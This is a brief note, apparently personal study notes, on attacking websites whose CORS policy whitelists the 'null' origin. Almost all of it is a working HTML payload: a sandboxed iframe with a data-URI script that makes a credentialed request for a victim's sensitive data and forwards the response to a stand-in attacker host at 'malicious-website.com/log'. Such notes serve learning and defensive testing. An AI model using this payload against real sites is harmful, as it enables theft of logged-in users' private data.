website white listing null origin:

an attacker might create a null origin using this  technieqe: 
```html
<html>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>

```